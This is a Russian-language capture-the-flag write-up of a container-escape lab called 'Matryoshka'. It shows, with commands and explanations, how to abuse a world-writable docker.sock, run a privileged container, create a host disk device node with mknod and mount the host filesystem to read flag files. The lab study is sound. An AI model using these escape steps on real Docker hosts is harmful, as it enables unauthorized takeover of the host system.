### 1. Первичный доступ и разведка

Мы подключились по SSH с учетными данными `matryoshka:n03sk@p3`. При подключении мы оказались в первом контейнере `94f2c33b6d8b`.

**Проверка нахождения в контейнере:**
```bash
ls -la /.dockerenv
```
/.dockerenv` — специальный файл, который Docker создаёт в каждом контейнере. Если он есть — мы внутри контейнера.

**Результат:** Файл `/.dockerenv` присутствовал.

**Проверка привилегий:**
```bash
ip link add dummy0 type dummy
```
`ip link add` создаёт новый сетевой интерфейс. Для этой операции нужны права `CAP_NET_ADMIN`. Если команда выполняется — контейнер привилегированный.

**Результат:** `RTNETLINK answers: Operation not permitted`. Контейнер **без `--privileged`**.

**Проверка `docker.sock`:**
```bash
ls -la /var/run/docker.sock
```
`ls -la` показывает файл `docker.sock` — это Unix-сокет, через который Docker управляет контейнерами. Если он доступен — мы можем создавать и запускать контейнеры.

**Результат:** `srw-rw-rw- 1 root 2375 0 Sep 24 02:04 /var/run/docker.sock`. Сокет доступен.

**Перечисление доступных образов:**
```bash
docker image ls
```
`docker image ls` выводит список всех локальных Docker-образов. Образ — это шаблон, из которого создаются контейнеры.

**Результат:** Обнаружены два образа: `matryoshka-level1:local` и `alpine:3.20`.


### 2. Получение флага level 2

```bash
docker run -v /:/host -it alpine:3.20 chroot /host bash
```
- `docker run` — создаёт и запускает новый контейнер.
- `-v /:/host` — монтирует корень текущего контейнера в `/host` нового контейнера.
- `-it` — интерактивный режим с терминалом.
- `alpine:3.20` — образ для запуска.
- `chroot /host bash` — меняет корень на `/host` и запускает `bash`.

**Что произошло:** Мы переключились в корень предыдущего контейнера. В новом контейнере `8687fbd64878` был обнаружен флаг:

```bash
cat flag_level2.txt
```

### 3. Попытка прохождения level 3

```bash
docker run -it matryoshka-level1:local /bin/bash
```
`docker run` запускает контейнер `matryoshka-level1`. `-it` — интерактивный режим. `/bin/bash` — запускает оболочку bash.

**Что произошло:** Появилось сообщение `[*] You are in the Matryoshka Containment Unit. Escape is futile.`

```bash
cd /root
```
`cd` меняет текущую директорию на `/root`.

**Результат:** `bash: cd: /root: Permission denied`. Доступ к `/root` отсутствует.


### 4. Container Escape через `--privileged`

```bash
docker run --privileged -v /:/host -it alpine:3.20 /bin/sh
```
- `--privileged` — даёт контейнеру все права (монтирование, сеть, доступ к устройствам).
- `-v /:/host` — монтирует корень хоста в `/host`.
- `alpine:3.20` — образ.
- `/bin/sh` — запускает оболочку sh.

**Проверка привилегий:**
```bash
ip link add dummy0 type dummy
```
`ip link add` создаёт сетевой интерфейс. Если команда выполняется без ошибок — мы привилегированные.

**Результат:** Команда выполнилась без ошибок.


### 5. Монтирование диска хоста

```bash
cat /proc/partitions
```
`cat` выводит содержимое файла `/proc/partitions`. Этот файл — виртуальный, его создаёт ядро Linux. В нём перечислены все разделы дисков, которые видит ядро.

**Результат:** Обнаружен раздел `259 2 20970479 nvme0n1p1`.

```bash
mknod /dev/nvme0n1p1 b 259 2
```
- `mknod` — создаёт специальный файл (device-ноду) вручную.
- `/dev/nvme0n1p1` — путь к создаваемому файлу.
- `b` — тип «блочное устройство» (диск).
- `259` — major number (какой драйвер ядра отвечает за диск).
- `2` — minor number (какой именно раздел).

Мы создали «дверь» к диску, которой не было в контейнере по умолчанию.

```bash
mount /dev/nvme0n1p1 /mnt/host
```
`mount` подключает файловую систему с диска `/dev/nvme0n1p1` в директорию `/mnt/host`.

`/mnt/host` стал корнем хоста.

```bash
ls /mnt/host/root/
```
`ls` выводит список файлов в `/mnt/host/root/`.

**Результат:** `flag_host.txt`


### 6. Получение флага level 3

```bash
find / -type f -name 'flag_level3.txt' 2>/dev/null
```
**Результат:**
```
/mnt/host/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/203/fs/root/flag_level3.txt
```

**Разбор пути:**
- `/mnt/host` — корень хоста.
- `/var/lib/containerd/...` — хранилище `containerd` (движок контейнеров).
- `snapshots/203/fs/` — файловая система контейнера `matryoshka-level1`.
- `/root/flag_level3.txt` — флаг внутри контейнера.
